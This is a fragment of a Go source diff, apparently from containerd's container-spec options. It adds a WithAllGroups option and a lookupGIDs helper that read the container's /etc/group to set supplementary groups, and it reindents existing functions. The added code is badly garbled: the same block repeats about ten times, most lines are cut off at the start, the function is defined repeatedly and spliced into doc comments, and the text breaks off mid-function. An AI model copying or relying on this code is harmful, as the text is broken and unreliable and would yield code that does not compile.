WithAdditionalGIDs(\"root\")(ctx, client, c, s)\n+                } else if s.Windows != nil {\n+                        s.Process.Env = replaceOrAppendEnvValues(config.Env, s.Process.Env)\n+                        cmd := config.Cmd\n+                        if len(args) > 0 {\n+                                cmd = args\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+}\n+\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+}\n+\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+}\n+\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+}\n+\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil\n+ nil, err\n+}\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil\n+ nil, err\n+}\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+\n+// WithAllGroups sets all supplementary groups for a particular user.\n+// This requires WithUser to be called with a username.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func lookupGIDs(root, username string) ([]uint32, error) {\n+var gids []uint32\n+groupPath := filepath.Join(root, \"etc\", \"group\")\n+data, err := os.ReadFile(groupPath)\n+if err != nil {\n+otExist(err) {\n+ nil, nil\n+ nil, err\n+}\n+for _, line := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+}\n+\n+                        }\n+                        s.Process.Args = append(config.Entrypoint, cmd...)\n+\n+                        s.Process.Cwd = config.WorkingDir\n+                        s.Process.User = specs.User{\n+                                Username: config.User,\n+                        }\n+                } else {\n+                        return errors.New(\"spec does not contain Linux or Windows section\")\n+                }\n+                return nil\n+        }\n }\n \n // WithRootFSPath specifies unmanaged rootfs path.\n func WithRootFSPath(path string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetRoot(s)\n-\t\ts.Root.Path = path\n-\t\t// Entrypoint is not set here (it's up to caller)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setRoot(s)\n+                s.Root.Path = path\n+                // Entrypoint is not set here (it's up to caller)\n+                return nil\n+        }\n }\n \n // WithRootFSReadonly sets specs.Root.Readonly to true\n func WithRootFSReadonly() SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetRoot(s)\n-\t\ts.Root.Readonly = true\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setRoot(s)\n+                s.Root.Readonly = true\n+                return nil\n+        }\n }\n \n // WithNoNewPrivileges sets no_new_privileges on the process for the container\n func WithNoNewPrivileges(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetProcess(s)\n-\ts.Process.NoNewPrivileges = true\n-\treturn nil\n+        setProcess(s)\n+        s.Process.NoNewPrivileges = true\n+        return nil\n }\n \n // WithHostHostsFile bind-mounts the host's /etc/hosts into the container as readonly\n func WithHostHostsFile(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\ts.Mounts = append(s.Mounts, specs.Mount{\n-\t\tDestination: \"/etc/hosts\",\n-\t\tType:        \"bind\",\n-\t\tSource:      \"/etc/hosts\",\n-\t\tOptions:     []string{\"rbind\", \"ro\"},\n-\t})\n-\treturn nil\n+        s.Mounts = append(s.Mounts, specs.Mount{\n+                Destination: \"/etc/hosts\",\n+                Type:        \"bind\",\n+                Source:      \"/etc/hosts\",\n+                Options:     []string{\"rbind\", \"ro\"},\n+        })\n+        return nil\n }\n \n // WithHostResolvconf bind-mounts the host's /etc/resolv.conf into the container as readonly\n func WithHostResolvconf(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\ts.Mounts = append(s.Mounts, specs.Mount{\n-\t\tDestination: \"/etc/resolv.conf\",\n-\t\tType:        \"bind\",\n-\t\tSource:      \"/etc/resolv.conf\",\n-\t\tOptions:     []string{\"rbind\", \"ro\"},\n-\t})\n-\treturn nil\n+        s.Mounts = append(s.Mounts, specs.Mount{\n+                Destination: \"/etc/resolv.conf\",\n+                Type:        \"bind\",\n+                Source:      \"/etc/resolv.conf\",\n+                Options:     []string{\"rbind\", \"ro\"},\n+        })\n+        return nil\n }\n \n // WithHostLocaltime bind-mounts the host's /etc/localtime into the container as readonly\n func WithHostLocaltime(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\ts.Mounts = append(s.Mounts, specs.Mount{\n-\t\tDestination: \"/etc/localtime\",\n-\t\tType:        \"bind\",\n-\t\tSource:      \"/etc/localtime\",\n-\t\tOptions:     []string{\"rbind\", \"ro\"},\n-\t})\n-\treturn nil\n+        s.Mounts = append(s.Mounts, specs.Mount{\n+                Destination: \"/etc/localtime\",\n+                Type:        \"bind\",\n+                Source:      \"/etc/localtime\",\n+                Options:     []string{\"rbind\", \"ro\"},\n+        })\n+        return nil\n }\n \n // WithUserNamespace sets the uid and gid mappings for the task\n // this can be called multiple times to add more mappings to the generated spec\n func WithUserNamespace(uidMap, gidMap []specs.LinuxIDMapping) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tvar hasUserns bool\n-\t\tsetLinux(s)\n-\t\tfor _, ns := range s.Linux.Namespaces {\n-\t\t\tif ns.Type == specs.UserNamespace {\n-\t\t\t\thasUserns = true\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\t\tif !hasUserns {\n-\t\t\ts.Linux.Namespaces = append(s.Linux.Namespaces, specs.LinuxNamespace{\n-\t\t\t\tType: specs.UserNamespace,\n-\t\t\t})\n-\t\t}\n-\t\ts.Linux.UIDMappings = append(s.Linux.UIDMappings, uidMap...)\n-\t\ts.Linux.GIDMappings = append(s.Linux.GIDMappings, gidMap...)\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                var hasUserns bool\n+                setLinux(s)\n+                for _, ns := range s.Linux.Namespaces {\n+                        if ns.Type == specs.UserNamespace {\n+                                hasUserns = true\n+                                break\n+                        }\n+                }\n+                if !hasUserns {\n+                        s.Linux.Namespaces = append(s.Linux.Namespaces, specs.LinuxNamespace{\n+                                Type: specs.UserNamespace,\n+                        })\n+                }\n+                s.Linux.UIDMappings = append(s.Linux.UIDMappings, uidMap...)\n+                s.Linux.GIDMappings = append(s.Linux.GIDMappings, gidMap...)\n+                return nil\n+        }\n }\n \n // WithCgroup sets the container's cgroup path\n func WithCgroup(path string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\ts.Linux.CgroupsPath = path\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                s.Linux.CgroupsPath = path\n+                return nil\n+        }\n }\n \n // WithNamespacedCgroup uses the namespace set on the context to create a\n // root directory for containers in the cgroup with the id as the subcgroup\n func WithNamespacedCgroup() SpecOpts {\n-\treturn func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n-\t\tnamespace, err := namespaces.NamespaceRequired(ctx)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\t\tsetLinux(s)\n-\t\ts.Linux.CgroupsPath = filepath.Join(\"/\", namespace, c.ID)\n-\t\treturn nil\n-\t}\n+        return func(ctx context.Context, _ Client, c *containers.Container, s *Spec) error {\n+                namespace, err := namespaces.NamespaceRequired(ctx)\n+                if err != nil {\n+                        return err\n+                }\n+                setLinux(s)\n+                s.Linux.CgroupsPath = filepath.Join(\"/\", namespace, c.ID)\n+                return nil\n+        }\n }\n \n // WithUser sets the user to be used within the container.\n // It accepts a valid user string in OCI Image Spec v1.0.0:\n //\n-//\tuser, uid, user:group, uid:gid, uid:group, user:gid\n+//      user, uid, user:group, uid:gid, uid:group, user:gid\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+// WithUser sets the user for the container.\n+// userstr is in the format of `user:group`.\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+othing if username is not provided.\n+ nil\n+c(root, username string) ([]uint32, error) {\n+t32\n+(root, \"etc\", \"group\")\n+os.ReadFile(groupPath)\n+nil {\n+otExist(err) {\n+ nil, nil // return empty if group file does not exist\n+ nil, err\n+e := range strings.Split(string(data), \"\\n\") {\n+e = strings.TrimSpace(line)\n+e == \"\" || strings.HasPrefix(line, \"#\") {\n+tinue\n+gs.Split(line, \":\")\n+(parts) < 4 || parts[0] == \"\" || parts[2] == \"\" {\n+tinue\n+gs.Split(parts[3], \",\")\n+:= range users {\n+username {\n+strconv.ParseUint(parts[2], 10, 32)\n+nil {\n+ nil, fmt.Errorf(\"bad gid in %q: %w\", line, err)\n+d(gids, uint32(gid))\n+ gids, nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n func WithUser(userstr string) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\n-\t\t// For LCOW it's a bit harder to confirm that the user actually exists on the host as a rootfs isn't\n-\t\t// mounted on the host and shared into the guest, but rather the rootfs is constructed entirely in the\n-\t\t// guest itself. To accommodate this, a spot to place the user string provided by a client as-is is needed.\n-\t\t// The `Username` field on the runtime spec is marked by Platform as only for Windows, and in this case it\n-\t\t// *is* being set on a Windows host at least, but will be used as a temporary holding spot until the guest\n-\t\t// can use the string to perform these same operations to grab the uid:gid inside.\n-\t\tif s.Windows != nil && s.Linux != nil {\n-\t\t\ts.Process.User.Username = userstr\n-\t\t\treturn nil\n-\t\t}\n-\n-\t\tparts := strings.Split(userstr, \":\")\n-\t\tswitch len(parts) {\n-\t\tcase 1:\n-\t\t\tv, err := strconv.Atoi(parts[0])\n-\t\t\tif err != nil {\n-\t\t\t\t// if we cannot parse as a uint they try to see if it is a username\n-\t\t\t\treturn WithUsername(userstr)(ctx, client, c, s)\n-\t\t\t}\n-\t\t\treturn WithUserID(uint32(v))(ctx, client, c, s)\n-\t\tcase 2:\n-\t\t\tvar (\n-\t\t\t\tusername  string\n-\t\t\t\tgroupname string\n-\t\t\t)\n-\t\t\tvar uid, gid uint32\n-\t\t\tv, err := strconv.Atoi(parts[0])\n-\t\t\tif err != nil {\n-\t\t\t\tusername = parts[0]\n-\t\t\t} else {\n-\t\t\t\tuid = uint32(v)\n-\t\t\t}\n-\t\t\tif v, err = strconv.Atoi(parts[1]); err != nil {\n-\t\t\t\tgroupname = parts[1]\n-\t\t\t} else {\n-\t\t\t\tgid = uint32(v)\n-\t\t\t}\n-\t\t\tif username == \"\" && groupname == \"\" {\n-\t\t\t\ts.Process.User.UID, s.Process.User.GID = uid, gid\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t\tf := func(root string) error {\n-\t\t\t\tif username != \"\" {\n-\t\t\t\t\tuser, err := UserFromPath(root, func(u user.User) bool {\n-\t\t\t\t\t\treturn u.Name == username\n-\t\t\t\t\t})\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\treturn err\n-\t\t\t\t\t}\n-\t\t\t\t\tuid = uint32(user.Uid)\n-\t\t\t\t}\n-\t\t\t\tif groupname != \"\" {\n-\t\t\t\t\tgid, err = GIDFromPath(root, func(g user.Group) bool {\n-\t\t\t\t\t\treturn g.Name == groupname\n-\t\t\t\t\t})\n-\t\t\t\t\tif err != nil {\n-\t\t\t\t\t\treturn err\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\ts.Process.User.UID, s.Process.User.GID = uid, gid\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t\tif c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n-\t\t\t\tif !isRootfsAbs(s.Root.Path) {\n-\t\t\t\t\treturn errors.New(\"rootfs absolute path is required\")\n-\t\t\t\t}\n-\t\t\t\treturn f(s.Root.Path)\n-\t\t\t}\n-\t\t\tif c.Snapshotter == \"\" {\n-\t\t\t\treturn errors.New(\"no snapshotter set for container\")\n-\t\t\t}\n-\t\t\tif c.SnapshotKey == \"\" {\n-\t\t\t\treturn errors.New(\"rootfs snapshot not created for container\")\n-\t\t\t}\n-\t\t\tsnapshotter := client.SnapshotService(c.Snapshotter)\n-\t\t\tmounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\n-\t\t\tmounts = tryReadonlyMounts(mounts)\n-\t\t\treturn mount.WithTempMount(ctx, mounts, f)\n-\t\tdefault:\n-\t\t\treturn fmt.Errorf(\"invalid USER value %s\", userstr)\n-\t\t}\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error 